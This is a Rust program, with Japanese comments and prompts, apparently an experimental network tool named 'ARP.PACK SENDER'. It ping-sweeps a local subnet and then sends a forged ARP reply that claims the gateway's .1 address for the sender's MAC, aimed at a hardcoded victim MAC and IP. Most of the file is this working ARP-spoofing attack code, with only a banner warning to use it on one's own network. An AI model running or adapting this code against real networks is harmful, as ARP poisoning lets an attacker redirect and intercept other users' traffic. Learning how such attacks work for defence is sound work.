use pnet::packet::arp::{ArpPacket, MutableArpPacket, ArpOperation};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::{Packet, MutablePacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::icmp::{self, IcmpTypes, echo_request, IcmpPacket, echo_reply::EchoReplyPacket};
use pnet::transport::{transport_channel, TransportChannelType};
use pnet::datalink::{self, NetworkInterface};
use std::time::{Duration, Instant};
use std::thread;
use std::io::ErrorKind;
use std::net::{Ipv4Addr, IpAddr};
use std::io::{self};

fn main() {
    println!("\x1b[92m
    ██████╗  ██████╗  ██████╗    ██████╗   █████╗   ██████╗ ██╗  ██╗
    ██╔══██╗ ██╔══██╗ ██╔══██╗   ██╔══██╗ ██╔══██╗ ██╔════╝ ██║ ██╔╝
    ███████║ ██████╔╝ ██████╔╝   ██████╔╝ ███████║ ██║      █████╔╝ 
    ██╔══██║ ██╔══██╗ ██╔═══╝    ██╔═══╝  ██╔══██║ ██║      ██╔═██╗ 
    ██║  ██║ ██║  ██║ ██║   ██╗  ██║      ██║  ██║ ╚██████╗ ██║  ██╗
    ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝   ╚═╝  ╚═╝      ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝

    ███████╗ ███████╗ ███╗   ██╗ ██████╗  ███████╗ ██████╗ 
    ██╔════╝ ██╔════╝ ████╗  ██║ ██╔══██╗ ██╔════╝ ██╔══██╗
    ███████╗ █████╗   ██╔██╗ ██║ ██║  ██║ █████╗   ██████╔╝
    ╚════██║ ██╔══╝   ██║╚██╗██║ ██║  ██║ ██╔══╝   ██╔══██╗
    ███████║ ███████╗ ██║ ╚████║ ██████╔╝ ███████╗ ██║  ██║
    ╚══════╝ ╚══════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══════╝ ╚═╝  ╚═╝
\x1b[0m");
    println!("ネットワークスキャン(ping),ARPスプーフィングを実行します。");
    println!("※\x1b[31mこれは実験用のソフトであるため、自分の管理下のネットワークでのみ使用してください。\x1b[0m");

    println!("犯罪行為ではないならyキーを押して続行。(y以外を押すと終了します。)");
    let mut buf = String::new();
    let _ = io::stdin().read_line(&mut buf).unwrap();
    if buf.trim() != "y" {
        return;
    }

    println!("ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー");
    println!("⟦ ネットワークの初期化を開始 ⟧");

    // ネットワークインターフェースの初期化
    let interface = datalink::interfaces().into_iter()
        .find(|iface: &NetworkInterface| iface.is_up() && !iface.is_loopback() && iface.is_broadcast())
        .expect("利用可能なネットワークインターフェースが見つかりませんでした");

    let interface_name = &interface.name;
    println!("使用するインターフェース: {}", interface_name);

    let my_ip = interface.ips
        .iter()
        .find_map(|ip_network| {
            match ip_network.ip() {
                IpAddr::V4(v4) => {
                    let mut octets = v4.octets();
                    //octets[3] = 1;
                    Some(Ipv4Addr::from(octets))
                }
                IpAddr::V6(_) => None,
            }
        }
        ).unwrap();
        println!("IPアドレス: {}", my_ip);

    println!("ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー");
    println!("⟦ ネットワークのスキャンを開始 ⟧");
    
    // raw IPv4 channelを作成
    let (mut tx, mut _rx) = transport_channel(
        1024,
        TransportChannelType::Layer3(IpNextHeaderProtocols::Icmp)
    ).unwrap();

    println!("(pingを送信中...)");
    // 送信スレッドをスポーン
    let _sender_handle = thread::spawn(move || {
        for i in 1..255 {
            let target_ip = Ipv4Addr::new(192, 168, my_ip.octets()[2], i);
            let mut ipv4_buffer = [0u8; 40];
            let mut icmp_buffer = [0u8; 8];

            // ICMP Echo Requestパケットを組み立てる
            let mut icmp_packet = icmp::echo_request::MutableEchoRequestPacket::new(&mut icmp_buffer).unwrap();
            icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
            icmp_packet.set_identifier(1);
            icmp_packet.set_sequence_number(i as u16);

            // チェックサム計算
            let checksum = icmp::checksum(&IcmpPacket::new(icmp_packet.packet()).unwrap());
            icmp_packet.set_checksum(checksum);

            // IPv4パケットを組み立てる
            let mut ipv4_packet = MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();
            ipv4_packet.set_version(4);
            ipv4_packet.set_header_length(5);
            ipv4_packet.set_total_length(40);
            ipv4_packet.set_ttl(64);
            ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
            ipv4_packet.set_source(my_ip);
            ipv4_packet.set_destination(target_ip);
            ipv4_packet.set_payload(icmp_packet.packet_mut());

            // パケット送信
            if let Err(e) = tx.send_to(ipv4_packet.to_immutable(), IpAddr::V4(target_ip)) {
                eprintln!("{}へのping送信に失敗: {}", target_ip, e);
            }

            thread::sleep(Duration::from_millis(10));
        }
    });
    
    println!("(ping送信完了)");
    println!("(pingの応答を待機中...)");

    let mut config = datalink::Config::default();
    config.read_timeout = Some(Duration::from_secs(1));

    let (_tx_dummy, mut datalink_rx) = match datalink::channel(&interface, config) {
        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("非対応の datalink チャネルです。"),
        Err(e) => panic!("datalinkチャンネルのエラー: {}", e),
    };
    
    //タイムアウト用の時刻保持
    let start = Instant::now();
    let timeout = Duration::from_secs(10);
    
    loop {
        // タイムアウト。永遠に待ち続けない
        if start.elapsed() >= timeout {
            println!("{}秒たったので受信を締め切ります", timeout.as_secs());
            break;
        }

        match datalink_rx.next() {
            Ok(frame) => {
                if let Some(eth) = EthernetPacket::new(frame) {
                    match eth.get_ethertype() {
                        EtherTypes::Ipv4 => {
                            if let Some(ipv4) = Ipv4Packet::new(eth.payload()) {
                                if ipv4.get_next_level_protocol() == IpNextHeaderProtocols::Icmp {
                                    if let Some(icmp) = IcmpPacket::new(ipv4.payload()) {
                                        let src = ipv4.get_source();
                                        let icmp_t = icmp.get_icmp_type();
                                        
                                        // Echo Reply を検出したら詳細を表示
                                        if icmp_t == IcmpTypes::EchoReply {
                                            let payload = icmp.packet();
                                            if payload.len() >= 8 {
                                                let id = u16::from_be_bytes([payload[4], payload[5]]);
                                                let seq = u16::from_be_bytes([payload[6], payload[7]]);
                                                println!("[Pingへの応答] from: {}", src);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        _ => { /* pong以外無視 */ }
                    }
                }
            }
            Err(e) => {
                if e.kind() == ErrorKind::TimedOut {
                    // 少し待ってから継続（busy loop 対策）
                    thread::sleep(Duration::from_millis(5));
                    continue;
                } else {
                    // 想定外のエラーはログ出して終了
                    eprintln!("Pongの受信処理でエラーが発生しました: {:?}", e);
                    break;
                }
            }
        }
    }


    println!("ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー");
    println!("⟦ ARPスプーフィングを開始 ⟧");
    // 生のソケットを作成
    let mut config = datalink::Config::default();
    config.read_timeout = Some(std::time::Duration::from_secs(1));
    let (mut tx, mut _rx) = match datalink::channel(&interface, config) {
        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Raw Ethernet channelの作成に失敗しました。"),
        Err(e) => panic!("エラー: {}", e),
    };

    
    
    // パケットデータのバッファを準備
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    // イーサネットヘッダの組み立て
    ethernet_packet.set_destination(pnet::datalink::MacAddr(0xbc, 0x24, 0x11, 0x91, 0xc9, 0xf6));
    ethernet_packet.set_source(interface.mac.unwrap());
    ethernet_packet.set_ethertype(pnet::packet::ethernet::EtherTypes::Arp);

    // ARPパケットのバッファを準備
    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    // ARPヘッダの組み立て
    arp_packet.set_hardware_type(pnet::packet::arp::ArpHardwareType::new(1));
    arp_packet.set_protocol_type(pnet::packet::ethernet::EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperation::new(2)); // リクエスト 1, アンサー 2
    arp_packet.set_sender_hw_addr(interface.mac.unwrap());
    arp_packet.set_sender_proto_addr(
    interface.ips
        .iter()
        .find_map(|ip_network| {
            match ip_network.ip() {
                IpAddr::V4(v4) => {
                    // 最後のオクテットだけ 1 にする
                    let mut octets = v4.octets();
                    octets[3] = 1;
                    Some(Ipv4Addr::from(octets))
                }
                IpAddr::V6(_) => None,
            }
        }
        )
        .unwrap()
    );
    arp_packet.set_target_hw_addr(pnet::datalink::MacAddr(0xbc, 0x24, 0x11, 0x91, 0xc9, 0xf6));//宛先のmacアドレス
    let target_ip: Ipv4Addr = Ipv4Addr::from([192, 168, 10, 105]); //宛先のIP
    arp_packet.set_target_proto_addr(target_ip);

    // ARPパケットをイーサネットパケットのペイロードに格納
    ethernet_packet.set_payload(arp_packet.packet_mut());

    // パケットを送信
    tx.send_to(ethernet_packet.packet(), None).unwrap().unwrap();
    println!("ARPスプーフィングを実行しています。宛先: {}", target_ip);
}